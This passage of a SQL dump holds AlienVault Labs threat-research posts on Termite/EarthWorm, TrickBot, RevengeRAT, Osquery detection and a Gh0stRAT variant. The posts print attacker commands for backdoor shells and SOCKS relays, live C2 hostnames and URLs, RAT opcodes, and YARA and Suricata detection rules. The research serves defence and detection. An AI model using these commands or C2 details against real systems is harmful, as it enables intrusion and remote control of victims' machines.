fb43358bd6265d944ae4291e7b932c4386c7f7bdbdb391cfa88e272045bce067d45abfea87fb355ab6a564f74131d22315cfdddcf8314e856b6c5d191ee16924fed67e538bbf8893e959b043455f37dc7da0b1e2d06c17c8e2746dde3d77ab475f36ce8ab58638f3dcba4af43616c37ad67ad52f73648fa854dfffe6c2734327fcb58a24ae9b70cac7da68cd9d47f9ee5359846c7b68e256f3e6f0d6f3ebdd958d4741f704ea90843f7ec764889387350e91a7045b359351de365ae08d567f05bd41b1e4e4e2034277cfc71f0d04941643b4bbd9f99e2fc426363f7e3af5f61f7f64ae5cfab6b40d96564c7a5f5aa1ccc076e00c58f3f5cbe018fb079ede861efca6d11268d710f88424690fafc146fa2a203b272d06c7fa62d27c1e30d041e2648ce8f86985f0178a81ce5165142e2557ab6526c79a8059eb458a8e162fdd1a84ce4f740e7658c7c7c3633d77e608cfa5b8d3949e5a169fc92e9920c7e328d941d546ab0eb98f221383d07d82b65f62d3a94e4b09b9cb95050c076c60f6597aa6___', 'malwaremalware researchcloudcryptocurrency mining', '/blogs/labs-research/making-it-rain-cryptocurrency-mining-attacks-in-the-cloud');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (203, 'Internet of Termites', 'Chris Doman', 'March 6, 2019 ', 'Termite is a tool used to connect together chains of machines on a network. You can run Termite on a surprising number of platforms including mobile devices, routers, servers and desktops.That means it can be used used to bounce a connection between multiple machines, to maintain a connection that otherwise wouldn’t be possible:Termite is a useful networking and penetration testing tool, but we’re seeing it used in attacks to enable access to machines too. There has been little reporting on Termite, beyond a brief mention in a report by Kaspersky of an earlier version of Termite called “EarthWorm”. Below, we’ve provided an outline on some of the attackers we’re seeing deploying Termite.Note: As we were publishing this, Symantec released a report on attackers using Termite in the 2018 attack stealing the health data of a quarter of the Singapore population.How Termite and EarthWorm WorkTermite and EarthWorm are publicly available tools written by an employee of 360NetLab. They can be considered an updated version of the well known packet relay tool HTRAN.Termite popped up on our radar when we were reviewing malicious binaries compiled to run on IoT architectures. Termite is available for a range https://github.com/rootkiter/Binary-files/tree/master/Termite/release/agent of different operating systems and architectures including x86 ARM, PowerPC, Motorola, SPARC and Renesas.This means an attacker can use a long chain of desktop, mobile and IoT devices to be able to connect through networks and DMZs.Termite can act as a SOCKS proxy to bounce traffic, as well as a lightweight backdoor that can upload and download files, and execute shell commands:The Termite help functionFor example, this is a typical sequence of commands you may see when investigating a compromised machine:Victim Host On a victim host, the attacker listens for incoming connections:agent.exe -l 8888Attacker HostThen  the attacker connects to the compromised machine:admin.exe -c [target_ip] -p 8888 And selects which compromised system to interact with:goto 1 Then they start a SOCKS proxy on the system to route traffic through it:socks 1080 And a shell on the compromised system that they can connect to with netcat:shell 6666Termite uses a distinctive binary protocol to initiate connections, as can be seen in this network traffic stream:Network traffic generated by TermiteThere is a good description of the command line arguments of EarthWorm here, and the source code of the agent is on GitHub.MalwareMobile EarthWorm used to Spy on Targets in TaiwanWe were surprised to find EarthWorm also packed into malware - presumably to provide packet relay functionality.In one Android application, EarthWorm is hidden inside an image file called box_07.png. The Application communicates with the hostname apache2013.qpoe[.]com - which resolves to a server in Taiwan.We’ve previously investigated this server when it was hosting Android malware known as Xsser. The Xsser malware communicates with a familiar hostname apache2012.epac[.]to and impersonates an application from a Taiwanese travel service:The same server has also previously been associated associated with a group known as “BlackTech” that primarily targets Taiwan.Windows EarthWormWe’ve also seen EarthWorm packed in with malware from crypto-mining campaigns.This malware is linked to a campaign previously reported on by TenCent. Machines at a University Hospital in Guangzhou China, and a children\'s hospital in Chongqing China, were infected with crypto-mining malware.Will Cross-Platform Malware Become a Thing? Network operators report that a significant amount of malicious traffic on their networks are now driven by IoT malware. So far this has been driven by IoT and Linux specific malware such as Mirai and Xor DDoS.DetectionWe detect network traffic across the various Windows, Linux, OSX, mobile and IoT platforms with:AV TROJAN EarthWorm/Termite IoT Agent Reporting InfectionAdditionally our host agent detects EarthWorm/Termite activity on hosts, and generically detects shell connections.OTX PulseYou can view indicators in OTX.Yara Rulesrule EarthWorm : LinuxMalware{    meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2019\"       license = \"Apache License, Version 2.0\"       sha256 = \"f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd\"       description = \"EarthWorm Packet Relay Tool\"       strings:        $elf = {7f 45 4c 46}        $string_1 = \"I_AM_NEW_RC_CMD_SOCK_CLIENT\"        $string_2 = \"CONFIRM_YOU_ARE_SOCK_CLIENT\"        $string_3 = \"SOCKSv4 Not Support now!\"        $string_4 = \"rssocks cmd_socket OK!\"    condition:        $elf at 0 and 2 of them} rule Termite : LinuxMalware{ meta:    author = \"AlienVault Labs\"    copyright = \"Alienvault Inc. 2019\"    license = \"Apache License, Version 2.0\"    sha256 = \"6062754dbe5503d375ad0e61f6b4342654624f471203fe50eb892e0029451416\"    description = \"Termite Packet Relay Tool\"    strings:        $elf = {7f 45 4c 46}        $string_1 = \"File data send OK!\"        $string_2 = \"please set the target first\"        $string_3 = \"It support various OS or CPU.For example\"        $string_4 = \"xxx -l [lport] -n [name]\"condition:    $elf at 0 and 2 of them}Suricata Rulealert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:\"AV TROJAN EarthWorm/Termite IoT Agent Reporting Infection\"; flow:established,to_server; content:\"|00 00 00 01|\"; offset:1; depth:4; content:\"|00 00 00 01 6b 00 00 00 01|\"; distance:7; within:9; content:\"agent\"; distance:4; within:5; pcre:\"/\\x00+?[\\x20-\\x7f]+?\\x00+?$/R\"; reference:url,https://github.com/anhilo/xiaogongju/tree/422136c014ba6b95ad3a746662be88372eb11b09; classtype:trojan-activity; sid:xxx; rev:1;)EarthWorm and TermiteSHA256 Hash381774ed8d6d69975694247acc80e42831ee68b43583c8734af52adff8f73373980fd1e947a8dd578c45bc76254b6aaa95b35e6ec33b8f41da268623500bd0f13d9aaac0a8e5c7eadd79d8d5c16119d04f4e9db7107fc44a1e32a8746a1ec3751ae62dbec330695d2eddc7cb9a65d47bad5f45af95e6c8a803f0780e0749a3ad27cd70b47588aa0a1c8d737cde89fe8de1351af49aa8f11378a1e26a40f268eb3537b3eaad16d59c1f0c22d6cbcfe5a1b4542cc4f6a1e3135e26873c0dd4b06f459333b4765363526b2f76353941a5e1346e9a71433bd16c1e34a03c3c13bf6b3141ce911e3da8b0bf9744ef0603f7fac55be157eafc54995a752759882da1b218c3accc4f65aae7bf7897adef35abdcca3697884860a6b5360e4f2d07bc26ed46af7c0674c69df2af1905ea58288f24d2d10e644d5446d8d2b71b251e8e70bde05ef2747f973d6ae9e4bd5fbeede55b27afd44882b83b4aee79330e856757e8a585eb434239e5c1714192482f20ec2483bf8eae4654ef77973524b3a151b45573fc266095e6d582b79db226145d0990129ad72c584863a61f3bd0e8056a043558fcbf640b58a45f2fed22fdd70c5d73ae781274927a2def5f71cb3e4ce02a15d57cbbc5b6f0d223b5a3470a6a444ea4ef49dad718cbe992c92cca935cfdac7def1d610dd78efae3dfa2eebade2ee76882b7e2b5df140aa068e25519d800bc63825790dbcdf9b7a69b9a566f71bc167a0a8353e735390c5815b247ac58efa817da584a49609de5985f5ba64cfb215f0c30c93fac11563ea32afa3820b3327139a487628dc7647507f77cff66269d5d4588c7647e408b07ec0c4b1f16a93eefc48b6d83c919ad123d4b27f3404604e99eeba9196cf81f3210a65d8ae1b89465a67aa2f4a66d72adefd632e15dee392cbeab0a843a4890598a9610660897b398f1afb55dc8b4bcff758082efde93e5ca9c2a6a725b16a4c82e7675393bf46fecfdd21cccc6cb3f8313098da5b7ad6a37b5349835a702b5caf8e794a7c6903f40c55bcac0a74645424d26b217b7725be826b7d558ecbce7ec5d3072d802e183418144370c394c70f88cd9ecfb23f9d6570e2134761d1a04deea5205cec31469cfb03af0857c9fae7e41683d34af7e04c6ed29439466761512ebbf28bad7561d092b9b3d82bb1aff3a17a490dd4da09cd315d8e94a52b8caa31ef7a7cf2a89c9d87aAndroid MalwareSHA256 Hash8774f27021146a863accbf34199a378a28ed28a1c616b8741a1dc8021783a4ecad560a69ad6aa327b59c123683189dec416889616b652beaa666a5919fe13935f8478ce363f824fc8dc14cebe84c29a4d12e66536c0250b9f12540e3a511935bHostnameszany.strangled[.]netapache2012.epac[.]toapache2013.qpoe[.]comCryptomining MalwareSHA256 Hashb1988efb8f1debd239e0c563f94d22362e43af77284796899f9987622ffb1463Hostnameslogv586[.]ccsock5[.]co', 'malwareotxattackspenetration testing', '/blogs/labs-research/internet-of-termites');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (204, 'Mapping TrickBot and RevengeRAT with MITRE ATT&CK and AlienVault USM Anywhere', 'Javier Ruiz', 'March 5, 2019 ', 'MITRE ATT&CK™ (Adversarial Tactics, Techniques and Common Knowledge) is a framework for understanding attackers’ behaviors and actions.We are pleased to announce that AlienVault USM Anywhere and Open Threat Exchange (OTX)  now include MITRE ATT&CK™ information. By mapping alarms to their corresponding ATT&CK techniques, we are assisting in prioritizing analysis work by understanding the context and scope of an attack.Below we’ve outlined how this new capability can help you investigate two threats - TrickBot and RevengeRat.Mapping a Trickbot infection with ATT&CKTrickbot is a malware family that was discovered a few years ago targeting the banking industry, but following some investigations, it is still active and evolving. The malware is usually delivered using attached Office documents via spear-phishing emails.This particular sample works by running a PowerShell script via command line from the malicious Excel document. The script will load the code that needs to be executed in memory and run the payload. In order to run the payload without being detected, the malware will try to disable and evade anti-malware protection. Once that is done, it will copy itself to another location and will run from there. It also spawns instances of the svchost.exe process to perform several tasks such as downloading config files and injecting into browsers to steal user credentials.AlienVault USM Anywhere detects and tracks the previous malware behavior and maps all different behaviors to ATT&CK definitions. This provides a clean understanding of the attack’s stage and tactics, and makes the analysis work easier.Running the sample in our environment we can observe different alarms that USM Anywhere is automatically triggering once the malicious Office document is opened by the user:Suspicious Process Created by Microsoft Office ApplicationSuspicious Powershell Encoded Command ExecutedWindows Defender DisabledWindows Unusual Process ParentTorMalicious SSL CertificateNow it’s possible to see those alarms mapped to the ATT&CK matrix:As we can observe, the ATT&CK matrix provides visibility of the techniques and tactics that Trickbot uses. Starting with Execution tactics, Defense Evasion mechanisms and finishing with Command and Control activity.The first alarm in the kill chain is the Suspicious Process Created by Microsoft Office Application. After opening the malicious document, the process EXCEL.EXE creates a new process to run a PowerShell command and load code in memory using the IO.MemoryStream class. We can see how the alarm Suspicious Powershell Encoded Command Executed detected the malicious activity and the encoded command trying to evade detection.Before injecting into other processes, the malware tries to disable the anti-malware protection mechanism to evade endpoint detections. In this case, we detect how it tries to stop the Windows Defender service by triggering the alarm Windows Defender Disabled.The next step performed by Trickbot is to copy itself to another directory and run again. Some new instances of svchost.exe process are started, but as you can see, the parent of that process is not the one that Windows normally uses in the process tree.We can see another alarm for that behavior indicating that the masquerading technique T1036 is being used:In the last step of the kill chain, the Trickbot malware tries to contact a command and control server. Network signatures matched the SSL domain used by this family and alerted it as Malicious SSL Certificate.Network activity has also detected a DNS query for a TOR domain, commonly used for anonymity and multi-hop proxy connections:Revenge RATThe Revenge Remote Access Trojan is a popular publicly available remote access trojan. Revenge RAT allows attackers to capture personal information, monitor user behavior using keylogger and webcam functionalities, stealing data and even dropping new malware in the infected system. Malspam delivers Revenge RAT via malicious Office documents while the infrastructure uses blog-publishing services like blogpost.com to host the malicious scripts that will be executed by the Office document.Once the system is infected, this malware uses persistence mechanisms such as scheduled tasks to guarantee the continued execution and beacon functionality to command and control servers. The analyzed variant of Revenge RAT uses local scheduled tasks with code execution to download the content from remote services.The following USM Anywhere alarms are triggered when the Office document is opened by the user:Suspicious Process Created by Microsoft Office ApplicationSuspicious Process Created by mshta.exeNetwork Activity From mshtaWindows Scheduled Job CreatedTaskkill killing Antivirus processMalware Beaconing to C&CRemote Access TrojanAnd we can also see it with the ATT&CK matrix:As we can see above, the RAT behavior previously detailed has generated many alarms which are all mapped to the ATT&CK framework. Now, it is simple to recognize the attack pattern, from Execution to the Command and Control beaconing.First, the alarm Suspicious Process Created by Microsoft Office Application detected that the EXCEL.EXE process was executing mshta.exe as a child process. Then we can see Network Activity From mshta to www.bitly.com in order to download malicious content:As a result of that activity, two alarms of Suspicious Process Created by mshta.exe were triggered. One of them detects when the code is loaded in memory using the PowerShell Reflection. Assembly class and the other one detects when the payload tries to kill the antivirus software which triggers Taskkill killing Antivirus process alarm.The activity also generates an alarm for Windows Scheduled Job Created. If we inspect the event linked to the alarm we can see a detailed view of the scheduled task created in the system for execution and persistence and how it’s mapped as ATT&CK technique T1053.Finally, after covering the Execution, Persistence and Defense Evasion tactics, it is also possible to review the command and control activity performed by the malware.Using network detections, we can easily recognize that the system was infected by a Remote Access Trojan named Revenge-RAT and there is another Malware Beaconing to C&C alarm for the same malware family indicating the system is communicating with the attacker infrastructure.', 'malwareotxlabsusm anywheretrickbot', '/blogs/labs-research/mapping-trickbot-and-revengerat-with-mitre-attck-and-alienvault-usm-anywhere');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (205, 'Malware Analysis using Osquery | Part 3', 'Javier Ruiz', 'December 17, 2018 ', 'In part 1 of this blog series, we analyzed malware behaviour, and, in part 2, we learned how to detect persistence tricks used in malware attacks. Still, there are more types of events that we can observe with Osquery when malicious activity happens. So, in the last blog post of the series, we will discuss how to detect another example of a technique used in a malware attack, one that involves installing a root certificate in the system that can be used to intercept information transmitted over secure TLS/SSL communications (man in the middle). We will also see how to use the Alienvault Agent and Alienvault USM Anywhere to create custom rules and detect malicious activity in your environment.Detecting newly installed root certificatesRoot certificates are usually pre-installed in a system by the manufacturer or by the software supply chain. They are used in public key cryptography to identify the Certificate Authority and are commonly used to establish TLS and SSL connections in web browsers. System and applications trust certificates installed in the root.Attackers can take advantage of this trust and install a root certificate in the system to intercept communications or code signing among other things. In this example, we will install our own certificate that could be used to intercept connections with banking platforms to steal users’ personal information. After installing it, we can take a look in the system Trusted Root Certification Authorities using the MMC console to see how our certificate has been placed.As we discussed before, Osquery can detect this activity by querying the certificates table. If we perform a query retrieving all certificates installed in Trusted Root Certification Authorities, we will discover our certificate in the same way we did before.This query can be used to list new certificates in the system:How to use the power of Osquery with Alienvault Agent and AlienVault USM AnywhereSo far, we have observed how Osquery can help to enable endpoint detection and response (EDR) capabilities. Now it’s time to see how we can use Osquery through the AlienVault Agent in AlienVault USM Anywhere.The AlienVault Agent is a lightweight endpoint agent based on Osquery that is configured to schedule queries by time intervals, enabling continuous endpoint detection. You can see the query collection in AlienVault USM at Data Sources > Agents > Configuration Profiles. These queries are maintained and updated by the AlienVault Labs team who research new threats and malicious activities, and build and update queries based on that research.If we go for Windows Full configuration profile, we can see how many queries the Agent is performing in the endpoint. Among all of these queries, we find some that are intended to hunt for persistence techniques, DLL injections, backdoors, cryptominers or even system misconfigurations.Use Case 1: Detecting system backdoor persistenceNow we will see how to create a custom orchestration rule to detect malicious activities using the events generated by the Alienvault Agent. The first thing we have to do is to search for interesting events that come from the AlienVault Agent data source. In this case, I will create an alarm rule for “Universal Windows Platform apps persistence detected” query. This query has been created for detecting a know persistence mechanism used to hide a program that will run on startup from the Autoruns tool.Once we have the events we want, it’s necessary to take notes of interesting fields. Some can  be used for conditions in our rule and others can be used as highlight fields. For example, in the event below, there are some interesting fields like:Data Source: AlienVault AgentEvent Type: detection_appx_persistenceRegistry Value: C:\\Windows\\system32\\cmd.exeIn the Settings > Rules section of USM Anywhere, we can create an orchestration rule for Alarm type. Because we want an alarm to trigger “Universal Windows Platform apps persistence” events, we can start adding trivial conditions first, such as Data Source == AlienVault Agent and Event Type == detection_appx_persistence. Then, imagine that we only want to trigger the alarm when the process placed in the registry value is either cmd.exe or powershell.exe, which are commonly used by backdoor systems. We can add a group condition with an OR operator inside to match the case.Once the orchestration rule is created, we can test it by running the malicious command to add a backdoor to the system using the technique we are trying to detect. After that, if we look in the alarms sections, we can see how the activity is triggering our new alarm rule.Use Case 2: Detecting processes listening connectionsImagine your company is being targeted by one of the latest threats and you want to detect the activity the malware is performing. After reading a blog post about the research, you discover that a piece of malware is using a modified version of netcat in order to gain a remote shell in the infected machine.If we take a look to the different events available from Agent, we can see that Listening Port events report when a process is listening for incoming connections.Then, we can create a new rule to match when a process placed in /tmp (temporary directory), folder that usually doesn’t require administrative privileges to write files, starts listening connections on a specific port and keeps waiting for establish a communication with the attacker. Also, we can add the parameter --allowfile /tmp/, which we learned from the research blog is a common IOC discovered. As we can see, one alarm has been triggered indicating that one of our hosts is infected with the malware we want to detect. We can take a look and find the most important characteristics of the activity in the highlight fields.ConclusionThroughout this blog series, we have discussed how the use of Osquery can help you to detect malware and other malicious activities on your endpoints. By implementing Osquery through the AlienVault Agent, part of USM Anywhere, you can take that malware detection and analysis to the next level. USM Anywhere enables powerful endpoint detection and response capabilities (EDR) continuously and automatically monitoring your endpoints for threats, correlating that data with network security data, and giving you a centralized console to review all security alarms, query your systems for forensics information, and create customized orchestration rules to automate those queries and other incident response actions.There’s so much more to discover. Take a tour of USM Anywhere in our online, interactive demo or get started with a free 14-day trial.', 'malwaremalware researchusm anywhereosquery', '/blogs/labs-research/malware-analysis-using-osquery-part-3');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (206, 'The odd case of a Gh0stRAT variant', 'James Quinn', 'March 25, 2019 ', 'This is a guest post by independent security researcher James Quinn. This will be Part 1 of a series titled Reversing Gh0stRAT Variants. As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.  Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1’s.  Of these samples, there was one specific sample that stood out to me.  A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from “Gh0st” to “nbLGX”, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.  Some key functionality is below:Can download more malwareOffline KeyloggerCleans Event logs.[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC In addition to a standard malware analysis blog post, I’d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future.Malware AnalysisBefore we begin the analyses, I’d like to clarify on some of the terms used.Stage1 - Typically the first contact or entry point for malware.  This is the first part of the malware to arrive on a system.SMB Malware - Any malware that uses the SMB protocol to spread.  SMB is typically used for file sharing between printers and other computers, however in recent years malware authors have been able to leverage this protocol to remotely infect hosts.RAT - Remote Access Trojan.  This type of malware allows for the complete control of an infected computer.Gh0stRAT - An open source RAT used primarily by Chinese actors. A more detailed analysis of the standard Gh0stRAT can be found here.Despite being a Gh0stRAT sample, this variant is very different than your standard Gh0stRAT sample.  One of the most noticeable differences is the use of encryption over the entire TCP segment, as a way for it to evade detection.  Additionally, this seems to be a lightweight version of Gh0stRAT, as it only has 12 commands, compared to the 73 for a full Gh0stRAT sample; 3 of those commands are undocumented.  Also, unlike most samples that I receive on my honeypot, this sample did not start as a DLL that communicates to a distribution server in order to download the stage1.  Instead, dropped on my honeypot was a full exe that served as the dropper.Domainshttp://mdzz2019.noip[.]cn:19931http://mdzz2019.noip[.]cn:3654/From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.  This is a dynamic DNS, meaning the actual IP changes quite frequently. Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell.ExploitsCVE-2017-0143, SMB exploitCVE-2017-0146, SMB exploitThese 2 exploits are EternalBlue/Doublepulsar and are used to drop the Stage1 Dropper onto a system. InstallationThe Gh0stRAT dropper arrives on a PC through the use of EternalBlue/DoublePulsar.  Once on a victim’s PC, the dropper executable is launched and it decrypts and loads the Gh0stRAT DLL into memory.  It then passes the config buffer to the extracted DLL and calls the exported function (Shellex)[Screenshot 2] The mainthread of the code.  Note the call at the bottom that calls ShellexGh0stRAT dll functionalityAn important note:  In its base state, this sample is damaged, therefore it will not install its services properly.  However, as the service information is included, I will list it anyways.  Additionally, samples downloaded from its distribution server DO install correctly,  and are downloaded during the base dll’s runtime.Once Shellex is called, it first passes each of the items in the config buffer to their own strings.  Next, it creates a mutex using the filename and checks to see if the Service key for the service name exists.  If so, it opens it using service manager.  If not, it first saves a copy of itself to %Program Files (x86)%/DIFXE/svchost.exe.  Next, it creates the service and runs it. Once the service is running, it creates a new mutex using [C2URL]:[PORT] and connects to the C2 server.  It then sends the Implant_Heartbeat opcode, and then calls its payload function to grabVersion Information (x86 and x64)Host informationSystemInfoProcessor Count and Write SpeedGlobal Memory Statusbefore formatting it, altering the InstallTime subkey, and sending all of the information back to its C2 in the Implant_Login buffer.Techniques for AnalysisWhen I was analyzing this sample, the malware was unable to connect to its C2.  However, I was still able to analyze the network traffic of the sample.  How, you might ask?  Using a hex editor and a script I wrote to encrypt text using the algorithm that this sample uses, I encrypted my own C2 address (192.168.1.108:7721) and replaced the hardcoded C2 address with my own encrypted address.  I then opened a listener on my own IP on the respective port.  [Screenshot 3] comparison of My IP (Left) vs C2 IP (Right)Next, using a debugger, I set a couple breakpoints in the Internet Communications function and ran the malware.  The malware sample then connected to my IP and sent information to me, which I was able to observe using Wireshark. After I’d captured the traffic, I was able to write another script to decrypt and decompress the traffic in order to view the data being sent. Additionally, I then wrote a socket script that detects the Gh0stRAT variant traffic, automatically decrypts the traffic, and then extracts the Implant_Opcodes for the sample.  A second version of the script allows commands to be sent back to the malware, after I enumerated the exact command format for the sample. [Screenshot 4] Output of Version 1 of the scriptSo far, the 2 opcodes that the sample has sent are 0x65 and 0x66, or Implant_Heartbeat and Implant_Login, respectively. “Hitting between the heartbeats”When sending commands, first the sample must login in with 0x65, then you can send commands to it.  However, you have to move fast as the sample will send an Implant_Heartbeat followed by an Implant_Login every 10 seconds or so, and if you try to send a command to the sample as it is responding with either opcode, it will ignore the command. A proof of concept of the command script can be found here , while the Implant extraction script and the Command Script will be included in the Appendix.Network Traffic FormatDuring my analysis of the sample,  I was able to enumerate not only the opcode commands, but also the format of the proprietary protocol, allowing me to send my own commands to the sample. First, just like the Gh0st in the dshell paper from SANS, the decrypted protocol consists of a 5 byte header (ngLGX), a 4byte packet length field, and finally another 4 byte uncompressed length field.  This is where the similarity ends as the Opcode and the data are compressed using ZLib, instead of just the data.  Additionally, the entire packet is encrypted with an algorithm making visual analysis of the Wireshark data challenging.  However, as the packet header is static, you can use the encrypted header as an identifier, like I did in my script.  The encrypted header is: “\\xEA\\xEE\\xCC\\xD3\\xB8” and is unchanged throughout the malware’s runthrough.Available OpcodesAs this sample is more of a lightweight version of Gh0stRAT, it only uses 12 commands, which are below along with their corresponding opcodes.OpcodeFunction NumberName0x000Command_Actived0x011Command_Keylog_offline0x021Command_Keylog_offline0x101Command_Keylog_offline0x1A1Command_Keylog_offline0x1F1Command_Keylog_offline0x201Command_Keylog_offline0x212Command_Session0x223Command_Remove0x234Command_Down_Exec0x245Command_Update_Server0x256Command_Clean_Event0x267Command_Open_URL_Hide0x278Command_Open_URL_Show0x289Command_Rename_Host0x2a10Command_Rename_Remark0x2b11Command_Execute0x2c12Command_Create&Inject0x2d1Command_Keylog_offline0x451Command_Keylog_offline0x491Command_Keylog_offlineCommand DefinitionsWhile I tried to make the command names easily understandable based on the name, I will take some time to explain what each of the commands do:Command_Actived: Uses InterlockedExchange to activate/deactivate the sample.Command_Keylog_offline:  Load into memory a dll that contains the function “PluginMe”.  After researching and analyzing additional Gh0stRAT samples while trying to figure out what dll contains “PluginMe”, I found a DLL for keylogging (called Keylog.dll) in a Gh0stRAT 2.0 sample that exported “PluginMe”.  Using that and a cross-comparison of another Gh0stRAT sample that I’ve previously analyzed, I was able to determine that “PluginMe” is a offline keyboard manager.Command_Session:  This command was the first command that I enumerated and first obtains the SeShutdownPrivilege before calling ExitWindowsEx to perform a variety of tasks, based on the data segment(It is treated as a flag) of the Gh0stRAT protocol.Command OptionFlagEWX_Logoff0x00EWX_Shutdown0x01EWX_Reboot0x02EWX_Poweroff0x08EWX_RestartApps0x40EWX_HybridShutdown0x00400000Command_Remove: This command takes filenames as an argument and searches for the filename before deleting it from the system.Command_Down_exec: This command downloads and executes new modules.  It takes a url as the argument and uses that to download and execute files.Command_Update_Server:  This command passes the string “Gh0st Update” to the malware sample before running the sample again.  When the sample restarts, it detects the “Gh0st Update” command line arg, and connects to the server in order to update the sample. Command_Clean_Event:  This command locates and deletes all of the event logs on the system.Command_Open_URL_Hide:   This command covertly opens a supplied URL.Command_Open_URL_Show:  Using Internet Explorer, this command takes a URL as an argument and opens a new Internet Explorer session, connecting to the supplied URL.*Command_Rename_Host: This command opens the malware’s Services key and adds the term “Host” to the Key.Command_Rename_Remark:  This command opens the malware’s Services key and adds the term “Remark” to the Key.*Command_Execute: This command executes a dropped file.*Command_Create&Inject:  This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it.The starred commands are undocumented commands.MitigationAs this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.  Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.  Specifically, you’d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability.However, if you DO get infected, you’ll want to delete the following registry keys (if they exist):HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqqHKLM/System/CurrentControlSet/Services/DirectX yta jsdrqHKLM/System/CurrentControlSet/Services/DirectX ytsda jrqAdditionally, you’ll want to delete any copies of “svchost.exe” that you find in %Program Files (x86)%/DIFXE/, as these are the dropped copies of the malware.IOC’s and YARA rulesSampleMD5SizeIPIOCTdxWCfg.exe474b3cd073b0a40d656b1a2f5bb673cf708KBhttp://mdzz2019.noip.cn:19931HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq %Program Files (x86)%/DIFXE/svchost.exeTdx_Dropped9bce099b5b01c305a5d98f1fd262bce1143.05KBhttp://mdzz2019.noip.cn:19931HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq dwm.exe00aaf0ddcc8d9b197c148e44d9e72d8d384KBhttp://mdzz2019.noip.cn:19931HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq%Program Files (x86)%/DIFXE/svchost.exedwm_droppeda548c18aa678626dab9b60628712cc1884KBhttp://mdzz2019.noip.cn:19931HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq  Yara Rules:rule gh0strat_variant_dropper  {        meta:            author = \"James Quinn, @lazyactivist192\"            desc = \"Identifies a Gh0stRAT dropper\" \n         strings:            $s1 = \"+gPp6bGvrqa9/fz2770A/amupqawrp8=\"            $s2 = \"Shellex\"            $s3 = \"SUSRAIZCqllahrCohrlojSarZSalpecasZ\"            $s4 = \"[printto(\\\"%1\\\",\\\"%2\\\",\\\"%3\\\",\\\"%4\\\")]\" \n             $s6 = \"SYST%-\\\\#urrENt#ONtrOLSEt\\\\SErvICEs\\\\\"               condition:            2 of ($s1, $s2, $s4) and 1 of ($s3, $s6) } rule gh0strat_variant {        meta:            author = \"James Quinn, @lazyactivist192\"            desc = \"Identifies a Gh0stRAT variant\"               strings:            $s1 = \"\\\\\\\\.\\\\agmkis2\"            $s2 = \"Shellex\"              $s3 = \"Gh0st Update\"            $s4 = \"PluginMe\"               condition:            all of them }Appendix Socket script Version 1: https://github.com/Jquinn147/Analysis-Automation/blob/master/Python/Gh0stRAT_Variant_Socket.pySocket Script V2(Command Script): https://github.com/Jquinn147/Analysis-Automation/blob/master/Python/Gh0stRatSocket.pyCitations:Martin, D. (n.d.). Gh0st in the dshell (Tech.). Sans.Rights to toolsScreenshot 1 was created using  Wireshark.  Wireshark uses the GNU Public License V2.Screenshot 2 was created using GHIDRA, an open source tool released by the NSA.Screenshot 3 was created using wxHexEditor.  wxHexEditor uses the GNU Public License V2.Screenshot 4 was created using a tool that I wrote.  I give AT&T and its affiliates permission to use my tool.', 'otxmalware researchthreat intellligencemalware analysisgh0strat', '/blogs/labs-research/the-odd-case-of-a-gh0strat-variant');
